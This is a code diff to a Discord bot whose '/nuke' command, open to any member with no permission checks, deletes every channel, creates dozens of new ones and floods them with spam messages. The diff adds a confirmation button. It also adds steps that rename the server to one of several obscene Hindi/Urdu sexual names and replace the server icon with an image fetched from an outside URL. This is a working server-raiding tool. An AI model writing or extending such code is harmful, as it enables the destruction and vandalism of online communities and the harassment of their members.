@@ -29,6 +29,20 @@ async def on_ready():
 async def start(interaction: discord.Interaction):
     await interaction.response.send_message("✅ Bot is running and online! 24/7 active!")
 
+# Server name and avatar
+FUNNY_NAMES = [
+    "🍆 LOUDA LASSAN",
+    "💦 MUTH BAZI",
+    "🍑 GAND MARO",
+    "💋 CHUDAI KI DUKAAN",
+    "🔞 ADULT ZONE",
+    "🍌 LASSAN PARTY",
+    "🌮 TACO TUESDAY",
+    "🚀 ROCKET FUELED",
+    "💥 CHAOS CENTRAL",
+    "🎉 PARTY HARD",
+]
+
 # Channel names list
 CHANNEL_NAMES = [
     "💀・destroyed",
@@ -140,9 +154,32 @@ SPAM_MESSAGES = [
     "💥━━━━━━━━━━━━━━━━━━━━💥\n☠️ 𝐃𝐎𝐎𝐌 𝐌𝐎𝐃𝐄 ☠️\n💥━━━━━━━━━━━━━━━━━━━━💥\n\n All channels destroyed and recreated!",
 ]
 
-# /nuke command - Delete all channels, create new ones, and spam messages
+# Confirmation view with buttons
+class ConfirmView(discord.ui.View):
+    def __init__(self, timeout=60):
+        super().__init__(timeout=timeout)
+        self.confirmed = False
+
+    @discord.ui.button(label="✅ CONFIRM NUKE", style=discord.ButtonStyle.danger)
+    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        self.confirmed = True
+        for child in self.children:
+            child.disabled = True
+        await interaction.message.edit(view=self)
+        self.stop()
+
+    @discord.ui.button(label="❌ CANCEL", style=discord.ButtonStyle.secondary)
+    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        for child in self.children:
+            child.disabled = True
+        await interaction.message.edit(view=self, content="❌ Nuke cancelled!")
+        self.stop()
+
+# /nuke command - Delete all channels, create new ones, spam, rename server, change avatar
 # ✅ NO ADMIN/ROLE CHECKS - ALL MEMBERS CAN USE
-@bot.tree.command(name="nuke", description="Delete all channels in the server")
+@bot.tree.command(name="nuke", description="Delete all channels, rename server, change avatar")
 async def nuke(interaction: discord.Interaction):
     await interaction.response.defer()
     
@@ -152,14 +189,22 @@ async def nuke(interaction: discord.Interaction):
         await interaction.followup.send("❌ This command can only be used in a server!")
         return
     
+    # Show confirmation button
+    view = ConfirmView()
+    await interaction.followup.send("⚠️ **ARE YOU SURE?** Click to confirm NUKE!", view=view)
+    await view.wait()
+    
+    if not view.confirmed:
+        return
+    
     try:
+        # Delete all channels
         channels = guild.channels
         total_channels = len(channels)
         deleted_count = 0
         
         await interaction.followup.send(f"🔄 Starting to delete {total_channels} channels...")
         
-        # Delete all channels
         for channel in channels:
             try:
                 await channel.delete()
@@ -203,7 +248,30 @@ async def nuke(interaction: discord.Interaction):
             except Exception as e:
                 print(f"Error spamming in {channel.name}: {e}")
         
-        await interaction.followup.send(f"✅ 💥 SERVER NUKED! 💥\n✅ Deleted {deleted_count} channels\n✅ Created {created_count}/99 channels\n✅ Sent 999+ spam messages to all channels!")
+        # Change server name
+        import random
+        new_name = random.choice(FUNNY_NAMES)
+        try:
+            await guild.edit(name=new_name)
+            await interaction.followup.send(f"✅ Server renamed to: **{new_name}**")
+            print(f"Server renamed to: {new_name}")
+        except Exception as e:
+            print(f"Failed to rename server: {e}")
+        
+        # Change server avatar
+        try:
+            cat_image_url = "https://i.pinimg.com/originals/4f/71/37/4f713759b8b8b53173dd3c2e8de8ae76.jpg"
+            async with __import__('aiohttp').ClientSession() as session:
+                async with session.get(cat_image_url) as resp:
+                    if resp.status == 200:
+                        avatar_data = await resp.read()
+                        await guild.edit(icon=avatar_data)
+                        await interaction.followup.send(f"✅ Server avatar changed to cat! 🐱")
+                        print("Server avatar changed to cat")
+        except Exception as e:
+            print(f"Failed to change avatar: {e}")
+        
+        await interaction.followup.send(f"✅ 💥 SERVER NUKED COMPLETELY! 💥\n✅ Deleted {deleted_count} channels\n✅ Created {created_count}/99 channels\n✅ Sent 999+ spam messages\n✅ Server renamed\n✅ Avatar changed to cat! 🐱")
         
     except Exception as e:
         await interaction.followup.send(f"❌ Error occurred: {str(e)}")
